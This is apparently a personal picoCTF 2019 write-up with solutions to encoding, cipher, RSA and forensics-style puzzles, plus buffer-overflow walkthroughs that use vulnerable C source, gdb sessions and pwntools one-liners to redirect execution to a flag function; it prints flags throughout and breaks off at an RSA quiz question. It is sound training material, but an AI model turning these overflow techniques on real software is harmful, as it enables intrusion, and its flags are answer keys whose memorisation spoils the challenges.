# Pico CTF 2019

<center>
| Challenge  | Category | Points |
| ------------- | ------------- | -------------: |
|[2Warm](#2Warm)| General Skills | 50 |
|[Lets Warm Up](#Lets-Warm-Up)| General Skills | 50 |
|[Warmed Up](#Warmed-Up)| General Skills | 50 |
|[Bases](#Bases)| General Skills | 100 |
|[First Grep](#First-Grep)| General Skills | 100 |
|[Resources](#Resources)| General Skills | 100 |
|[strings it](#strings-it)| General Skills | 100 |
|[What's a net cat?](#what's-a-net-cat?)| General Skills | 100 |
|[Based](#Based)| General Skills | 200 |
|[OverFlow 0](#OverFlow-0)| Binary Exploitation | 50 |
|[OverFlow 1](#OverFlow-1)| Binary Exploitation | 150 |
|[OverFlow 2](#OverFlow-2)| Binary Exploitation | 250 |
|[NewOverFlow-1](#NewOverFlow-1)| Binary Exploitation | 200 |
|[NewOverFlow-2](#NewOverFlow-2)| Binary Exploitation | 250 |
|[The Numbers](#The-Numbers)| Cryptography | 50 |
|[13](#13)| Cryptography | 100 |
|[Easy1](#Easy1)| Cryptography | 100 |
|[Caesar](#Caesar)| Cryptography | 100 |
|[Flags](#Flags)| Cryptography | 200 |
|[Mr-Worldwide](#Mr-Worldwide)| Cryptography | 200 |
|[Tapping](#Tapping)| Cryptography | 200 |
|[La Cifra De](#La-Cifra-De)| Cryptography | 200 |
|[RSA Pop Quiz](#RSA-Pop-Quiz)| Cryptography | 200 |
|[MiniRSA](#MiniRSA)| Cryptography | 300 |
|[waves over lambda](#waves-over-lambda)| Cryptography | 300 |
|[b00tl3gRSA2](#b00tl3gRSA2)| Cryptography | 400 |
|[b00tl3gRSA3](#b00tl3gRSA3)| Cryptography | 450 |
|[john_pollard](#john_pollard)| Cryptography | 500 |
|[unzip](#unzip)| Forensics | 50 |
|[So Meta](#So-Meta)| Forensics | 150 |
|[What Lies Within](#What Lies Within)| Forensics | 150 |
|[extensions](#extensions)| Forensics | 150 |
|[WhitePages](#WhitePages)| Forensics | 250 |
|[m00nwalk](#m00nwalk)| Forensics | 200 |
|[pastaAAA](#pastaAAA)| Forensics | 300 |
|[Insp3ct0r](#Insp3ct0r)| Web | 50 |
|[dont-use-client-side](#dont-use-client-side)| Web | 100 |
|[where are the robots](#where-are-the-robots)| Web | 100 |
|[Client-side-again](#Client-side-again)| Web | 200 |
|[picobrowser](#picobrowser)| Web | 200 |
|[Java Script Kiddie](#Java-Script-Kiddie)| Web | 400 |
|[Java Script Kiddie 2](#Java-Script-Kiddie-2)| Web | 550 |
</center>


# General Skills

### 2Warm
#### Points: 50
>Can you convert the number 42 (base 10) to binary (base 2)?


```python
>>> "{0:b}".format(42)
"101010"
```

---

### Lets Warm Up 
#### Points: 50 


>If I told you a word started with 0x70 in hexadecimal, what would it start with in ASCII? 
>

```
chr(0x70)

'p'
```

picoCTF{p}

---

### Warmed Up 
#### Points: 50

>What is 0x3D (base 16) in decimal (base 10).

```python
>>> 0x3D
61
```

picoCTF{61}

---


### Bases 
#### Points: 100

> What does this bDNhcm5fdGgzX3IwcDM1 mean? I think it has something to do with bases.

Decode from base64 to find

```bash
echo bDNhcm5fdGgzX3IwcDM1 | base64 --decode
l3arn_th3_r0p35
```

picoCTF{l3arn_th3_r0p35}

---

### First Grep 
#### Points: 100

Teaching you to use grep to find the flag. Lets find all instances of "pico" in the file

```bash
grep -e "pico" file.dms 
picoCTF{grep_is_good_to_find_things_5f0c3d9e}
```

picoCTF{grep_is_good_to_find_things_5f0c3d9e}


---

### Resources 
#### Points: 100

Go to [https://picoctf.com/resources](https://picoctf.com/resources) 

and grab the flag

picoCTF{r3source_pag3_f1ag} (2019 competition)

---

### strings it 
#### Points: 100 

> Can you find the flag in file without running it? You can also find the file in /problems/strings-it_3_d2b2eb25dc5e3f3625810131832de295 on the shell server.
> 
```bash
strings strings.dms 
picoCTF{5tRIng5_1T_30be4706}
```

picoCTF{5tRIng5_1T_30be4706}

---

### what's a net cat? 
#### Points: 100 

>Using netcat (nc) is going to be pretty important. Can you connect to 2019shell1.picoctf.com at port 12265 to get the flag?
>

```
Jack: ~$ nc 2019shell1.picoctf.com 12265
You're on your way to becoming the net cat master
picoCTF{nEtCat_Mast3ry_589c8b71}
```

---

### Based 
#### Points: 200

>To get truly 1337, you must understand different data encodings, such as hexadecimal or binary. Can you get the flag from this program to prove you are on the way to becoming 1337? Connect with nc 2019shell1.picoctf.com 20836.

```
Let us see how data is stored
Please give the 01101100 01100001 01101101 01110000 as a word.
...
you have 45 seconds.....

Input:
lamp
Please give me the  163 164 162 145 145 164 as a word.
Input:
street
Please give me the 6f76656e as a word.
Input:
oven
You've beaten the challenge
Flag: picoCTF{learning_about_converting_values_2360e4dd}
```

picoCTF{learning_about_converting_values_2360e4dd}

---

# Binary Exploitation

### OverFlow 0
#### Points: 50

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}

```

Run 

```bash
./vuln `python -c "print 'A'*1000"`
```

picoCTF{3asY_P3a5y8645475a}

--- 

### OverFlow 1
#### Points: 150

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

Sending a bunch of data to

```
jack4818@pico-2019-shell1:/problems/overflow-1_1_3039944758e6085624f51d62226d3c13$ python -c "print 'A'*(100)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x41414141 !
```

So we see that we are able to overwrite the return address by sending a very long string. To find the correct offset we use 

```
jack4818@pico-2019-shell1:/problems/overflow-1_1_3039944758e6085624f51d62226d3c13$ cyclic 200 | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x61616174 !
Segmentation fault (core dumped)

jack4818@pico-2019-shell1:/problems/overflow-1_1_3039944758e6085624f51d62226d3c13$ cyclic -l 0x61616174
76
```

Now we know the offset, we need the address of the function `flag()`

```bash
jack4818@pico-2019-shell1:/problems/overflow-1_1_3039944758e6085624f51d62226d3c13$ gdb ./vuln

(gdb) info address flag
Symbol "flag" is at 0x80485e6 in a file compiled without debugging.
```

With the buffer size and the address, we can now call the function

```
jack4818@pico-2019-shell1:/problems/overflow-1_1_3039944758e6085624f51d62226d3c13$ python -c "from pwn import *; print 'A'*(76)+p32(0x80485e6)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
```

picoCTF{n0w_w3r3_ChaNg1ng_r3tURn56b6d6d97}

---

### OverFlow 2 
#### Points: 250

>Now try overwriting arguments. Can you get the flag from this program? You can find it in /problems/overflow-2_2_fc3395ae58774b9c251598a8e4bea2e0 on the shell server. Source.
>


Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

The aim is to overflow and send `flag(0xDEADBEEF,0xC0DED00D)`

Like the last challenge, using gdb we can find the address of `flag()`

```
$ gdb ./vuln
(gdb) info address flag
Symbol "flag" is at 0x80485e6 in a file compiled without debugging.
```

To find the offset, we can run vuln in gdb to get the seg fault when we send in 1000 characters of cyclic 

```
Jack: ~$ cyclic 1000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
```

Program received signal SIGSEGV, Segmentation fault.
0x62616177 in ?? ()

The offset is then found

```
$ cyclic -l 0x62616177
188
```

#### Exploit

With the offset, we send the address of flag function: 0x80485e6, followed by **4 bytes** to pad the second return address and then include our two arguments: `0xDEADBEEF, 0xC0DED00D`

Put togther, we have

`$ python -c "from pwn import *; print 'A'*(188)+p32(0x80485e6)+'A'*4+p32(0xDEADBEEF)+p32(0xC0DED00D)" | ./vuln`


picoCTF{arg5_and_r3turn5dc972417}

---

### NewOverFlow-1 
#### Points: 200

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

Another overflow challenge. This time we're working with a 64bit machine. To return the function `flag()` we will need two things:

- The offset for the return address
- The return address of the function `flag`

#### Offset

To calculate the offset, lets grab 1000 characters from cyclic

```
Jack: ~$ cyclic 1000
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
```

We start up gdb. Lets disassemble `vuln` and set a breakpoint at the input of our string

```
disassemble vuln

Dump of assembler code for function vuln:
   0x00000000004007cc <+0>:	push   %rbp
   0x00000000004007cd <+1>:	mov    %rsp,%rbp
   0x00000000004007d0 <+4>:	sub    $0x40,%rsp
   0x00000000004007d4 <+8>:	lea    -0x40(%rbp),%rax
   0x00000000004007d8 <+12>:	mov    %rax,%rdi
   0x00000000004007db <+15>:	mov    $0x0,%eax
   0x00000000004007e0 <+20>:	callq  0x400630 <gets@plt>
   0x00000000004007e5 <+25>:	nop
   0x00000000004007e6 <+26>:	leaveq 
   0x00000000004007e7 <+27>:	retq   
End of assembler dump.
```

```
break * vuln+20

Breakpoint 1 at 0x4007e0
```

We identify the addresses of rsp and rbp. 

```
(gdb) x $rsp
0x7ffd5ab97a30:	0x0000003c
(gdb) x $rbp
0x7ffd5ab97a70:	0x5ab97aa0
```

`0x7ffd5ab97a70` will help us find the int from cyclic to identify. Lets dump 120 hexadecimal addresses from the address of rsp

```
(gdb) x/120x $rsp
0x7ffd5ab97a30:	0x61616161	0x61616162	0x61616163	0x61616164
0x7ffd5ab97a40:	0x61616165	0x61616166	0x61616167	0x61616168
0x7ffd5ab97a50:	0x61616169	0x6161616a	0x6161616b	0x6161616c
0x7ffd5ab97a60:	0x6161616d	0x6161616e	0x6161616f	0x61616170
0x7ffd5ab97a70:	0x61616171	0x61616172	0x61616173	0x61616174
0x7ffd5ab97a80:	0x61616175	0x61616176	0x61616177	0x61616178
0x7ffd5ab97a90:	0x61616179	0x6261617a	0x62616162	0x62616163
0x7ffd5ab97aa0:	0x62616164	0x62616165	0x62616166	0x62616167
0x7ffd5ab97ab0:	0x62616168	0x62616169	0x6261616a	0x6261616b
0x7ffd5ab97ac0:	0x6261616c	0x6261616d	0x6261616e	0x6261616f
0x7ffd5ab97ad0:	0x62616170	0x62616171	0x62616172	0x62616173
0x7ffd5ab97ae0:	0x62616174	0x62616175	0x62616176	0x62616177
0x7ffd5ab97af0:	0x62616178	0x62616179	0x6361617a	0x63616162
0x7ffd5ab97b00:	0x63616163	0x63616164	0x63616165	0x63616166
0x7ffd5ab97b10:	0x63616167	0x63616168	0x63616169	0x6361616a
0x7ffd5ab97b20:	0x6361616b	0x6361616c	0x6361616d	0x6361616e
0x7ffd5ab97b30:	0x6361616f	0x63616170	0x63616171	0x63616172
0x7ffd5ab97b40:	0x63616173	0x63616174	0x63616175	0x63616176
0x7ffd5ab97b50:	0x63616177	0x63616178	0x63616179	0x6461617a
0x7ffd5ab97b60:	0x64616162	0x64616163	0x64616164	0x64616165
0x7ffd5ab97b70:	0x64616166	0x64616167	0x64616168	0x64616169
0x7ffd5ab97b80:	0x6461616a	0x6461616b	0x6461616c	0x6461616d
0x7ffd5ab97b90:	0x6461616e	0x6461616f	0x64616170	0x64616171
0x7ffd5ab97ba0:	0x64616172	0x64616173	0x64616174	0x64616175
0x7ffd5ab97bb0:	0x64616176	0x64616177	0x64616178	0x64616179
0x7ffd5ab97bc0:	0x6561617a	0x65616162	0x65616163	0x65616164
0x7ffd5ab97bd0:	0x65616165	0x65616166	0x65616167	0x65616168
0x7ffd5ab97be0:	0x65616169	0x6561616a	0x6561616b	0x6561616c
0x7ffd5ab97bf0:	0x6561616d	0x6561616e	0x6561616f	0x65616170
0x7ffd5ab97c00:	0x65616171	0x65616172	0x65616173	0x65616174
```

Now we can calculate the offset 

```
Jack: ~$ cyclic -l 0x61616173
72
```


#### Function address
```
(gdb) info address flag
Symbol "flag" is at 0x400767 in a file compiled without debugging.
```

There is some alignment issue, and the correct address is `0x400767`. Apparently this is to do with Ubuntu 18.04. I don't know.


#### Exploit

As we know the offset and the function address, we can use overflow to point to the function flag and print out the flag

```bash
python -c "from pwn import *; print 'A'*(72)+p64(0x400768)" | ./vuln
```

picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_351346a2}

---

### NewOverFlow-2
#### Points: 250

So while reading the source of this challenge

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

bool win1 = false;
bool win2 = false;

void win_fn1(unsigned int arg_check) {
  if (arg_check == 0xDEADBEEF) {
    win1 = true;
  }
}

void win_fn2(unsigned int arg_check1, unsigned int arg_check2, unsigned int arg_check3) {
  if (win1 && \
      arg_check1 == 0xBAADCAFE && \
      arg_check2 == 0xCAFEBABE && \
      arg_check3 == 0xABADBABE) {
    win2 = true;
  }
}

void win_fn() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  if (win1 && win2) {
    printf("%s", flag);
    return;
  }
  else {
    printf("Nope, not quite...\n");
  }
}

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Can you match these numbers?");
  vuln();
  return 0;
}
```

I noticed an error in the challenge. The flag is loaded into `win_fn()` which is the intended solution, but it's also loaded into the function `flag()`

```c
void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```

Unlike `win_fn()` this has no logical arguments and we can simply call it, exactly like the previous challenge...

The **offset** was found to be `72`, and gdb points to the flag function

```
(gdb) info address flag
Symbol "flag" is at 0x40084d in a file compiled without debugging.
```

So we can simply collect the flag, after fixing the flag pointer, and win the challenge. 

```
python -c "from pwn import *; print 'A'*(72)+p64(0x40084e)" | ./vuln
Welcome to 64-bit. Can you match these numbers?
picoCTF{r0p_1t_d0nT_st0p_1t_b3358018}
Segmentation fault (core dumped)
```

picoCTF{r0p_1t_d0nT_st0p_1t_b3358018}


---


# Cryptography

### The Numbers 
#### Points: 50

> The numbers... what do they mean? 

File contains

> 16 9 3 15 3 20 6 20 8 5 14 21 13 2 5 18 19 13 1 19 15 14

Converting the numbers to letters using: a-z = 1-26:

`P I C O C T F T H E N U M B E R S M A S O N`

PICOCTF{THENUMBERSMASON}

---



### 13
#### Points: 100

ROT13 on the file:

```
cvpbPGS{abg_gbb_onq_bs_n_ceboyrz}
picoCTF{not_too_bad_of_a_problem}
```

---

### Easy1 
#### Points: 100

We are given the cipher `UFJKXQZQUNB` and the key `SOLVECRYPTO`. The table given is the Vigenere table, using it we obtain the flag

picoCTF{CRYPTOISFUN}

---

### Caesar
#### Points: 100

Trial and error through to find that rot7 is the correct decryption.

```
picoCTF{vkhllbgzmaxknubvhglzeipcie}
picoCTF{crossingtherubiconsglpwjpl}
```

--- 


### Flags 
#### Points: 200

The flag is encoded using [Nautical Flags](https://en.wikipedia.org/wiki/International_maritime_signal_flags)

PICOCTF{F1AG5AND5TUFF}

---

### Mr-Worldwide 
Points: 200 

>picoCTF{(35.028309, 135.753082)(46.469391, 30.740883)(39.758949, -84.191605)(41.015137, 28.979530)(24.466667, 54.366669)(3.140853, 101.693207)_(9.005401, 38.763611)(-3.989038, -79.203560)(52.377956, 4.897070)(41.085651, -73.858467)(57.790001, -152.407227)(31.205753, 29.924526)}

Each pair of numbers are coordinates. The coordinates give the following cities

```
KAMIGYO
ODESA
DAYTON
ISTANBUL
ABU DHABI
KUALA LUMPUA
_
ADDIS ABABA
Loja
Amsterdam
SLEEPY HOLLOW
Kodiak
Alexandria
```

Taking the first letter of each of the cities gives the flag

picoCTF{KODIAK_ALASKA}

---

### Tapping 
#### Points: 200 

> Theres tapping coming in from the wires. What's it saying nc 2019shell1.picoctf.com 45617.
> 

Connecting to the port we recieve

```
.--. .. -.-. --- -.-. - ..-. { -- ----- .-. ... ...-- -.-. ----- -.. ...-- .---- ... ..-. ..- -. ...-- ..... ..--- ....- ----. ....- -.... ....- --... .---- } 
```

Decoding as morse gives the flag

PICOCTF{M0RS3C0D31SFUN3524946471}

---

### La Cifra De
### Points 200 

>nc 2019shell2.picoctf.com 60147

```
Ne iy nytkwpsznyg nth it mtsztcy vjzprj zfzjy rkhpibj nrkitt ltc tnnygy ysee itd tte cxjltk

Ifrosr tnj noawde uk siyyzre, yse Bnretèwp Cousex mls hjpn xjtnbjytki xatd eisjd

Iz bls lfwskqj azycihzeej yz Brftsk ip Volpnèxj ls oy hay tcimnyarqj dkxnrogpd os 1553 my Mnzvgs Mazytszf Merqlsu ny hox moup Wa inqrg ipl. Ynr. Gotgat Gltzndtg Gplrfdo 

Ltc tnj tmvqpmkseaznzn uk ehox nivmpr g ylbrj ts ltcmki my yqtdosr tnj wocjc hgqq ol fy oxitngwj arusahje fuw ln guaaxjytrd catizm tzxbkw zf vqlckx hizm ceyupcz yz tnj fpvjc hgqqpohzCZK{m311a50_0x_a1rn3x3_h1ah3x8j3m3a15}

Zmp fowdt cjwl-jtnusjytki oeyhcivytot tq a vtwygqahggptoh nivmpr nthebjc, wgx xajj lruzyd 1467 hd Weus Mazytszf Llhjcto.

Yse Bnretèwp Cousex nd tnjceltce ytxeznxey hllrjo tnj Llhjcto Itsi tc Argprzn Nivmpr.

Os 1508, Uonfynkx Eroysesnfs osgetypd zmp su-hllrjo tggflg wpczf (l mgycid tq snnqtki llvmlbkyd) tnfe wuzwd rfeex gp a iwttohll itxpuspnz tq tnj Gimjyèrk Htpnjc.

Bkqwayt’d skhznj gzoqqpt guaegwpd os 1555 ls g hznznyugytot tq tnj qixxe. Tnj wocjc hgqgey tq tnj llvmlbkyd axj yoc xsilypd xjrurfcle, gft zmp arusahjes gso tnj tnjji lkyeexx lrk rtxki my sjlny tq a sspmustc qjj pnwlsk, bsiim nat gp dokqexjyt cneh kfnh itcrkxaotipnz.
```

Which we can decode using Vigenere, with the key "flag"

```
It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenère Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso 

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3r8e3b3a15}

The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.

The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.

In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.

Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.
```

picoCTF{b311a50_0r_v1gn3r3_c1ph3r8e3b3a15}

---

### RSA Pop Quiz
### Points: 200 

> Class, take your seats! It's PRIME-time for a quiz... 
> `nc 2019shell1.picoctf.com 49989`

### Introduction
>Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!

### Question 1
>**NEW PROBLEM**
>q : 60413
>p : 76753
>**PRODUCE THE FOLLOWING**
>n
>IS THIS POSSIBLE and FEASIBLE? (Y/N)

Here we are asked to calculate the modulus `n`, given `p,q`. As `n = pq` **this is feasible** and we find that

``
n = pq = 60413 \times  76753 = 4636878989
``

Using python

```python
p = 60413
q = 76753
n = p*q
print(n)

4636878989
```

### Question 2

> 
>**NEW PROBLEM**
>p : 54269
>n : 5051846941
>**PRODUCE THE FOLLOWING**
>q
>IS THIS POSSIBLE and FEASIBLE? (Y/N):

Here we are asked to find the prime `q`, given the modulus `n` and prime `p`. **This is feasible** as we can recover q from division.

``
q = \frac{n}{p} = \frac{5051846941}{54269} = 93089
``

Using python

```python
p = 54269
n = 5051846941
q = n//p
print(q)

93089
```

### Question 3

>**NEW PROBLEM**
>e : 3
>n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
**PRODUCE THE FOLLOWING**
q
p
IS THIS POSSIBLE and FEASIBLE? (Y/N):

Here we are given the public key `(n,e)`. Although `e` is small, and potentially the RSA encryption may be weak to an attack, we cannot factor `n` in a reasonable time and so this is **not feasible**.

### Question 4

>**NEW PROBLEM**
q : 66347
p : 12611
#**PRODUCE THE FOLLOWING**
totient(n)
IS THIS POSSIBLE and FEASIBLE? (Y/N):

Here we are asked to calculate the totient of `n` given two primes `p,q`. This is feasible. We use the standard realtion:

``
\phi(n) = (p-1)(q-1) = 836623060
``

Using python

```python
p = 12611
q = 66347
phi = (p-1)*(q-1)
print(phi)

836623060
```

### Question 5
>**NEW PROBLEM**
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
#**PRODUCE THE FOLLOWING**
ciphertext
IS THIS POSSIBLE and FEASIBLE? (Y/N):

We are now being asked to encrypt the message `m` to produce the ciphertext `c`. As we are given both the modulus `m` and the exponent `e`, we can perform the encryption in the  standard way and so **this is feasible**.

``
c = m^e \mod n
``

Using python

```python
m = 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
n = 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
e = 3

c = pow(m,e,n) 
print(c)

256931246631782714357241556582441991993437399854161372646318659020994329843524306570818293602492485385337029697819837182169818816821461486018802894936801257629375428544752970630870631166355711254848465862207765051226282541748174535990314552471546936536330397892907207943448897073772015986097770443616540466471245438117157152783246654401668267323136450122287983612851171545784168132230208726238881861407976917850248110805724300421712827401063963117423718797887144760360749619552577176382615108244813
```

### Question 6
>**NEW PROBLEM**
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
**PRODUCE THE FOLLOWING**
plaintext
IS THIS POSSIBLE and FEASIBLE? (Y/N)

Here we are asked to decrypt a message but we are only given the public key `(n,e)`. Therefore it is **not feasible** to find the plaintext `m`. 


### Question 7
>**NEW PROBLEM**
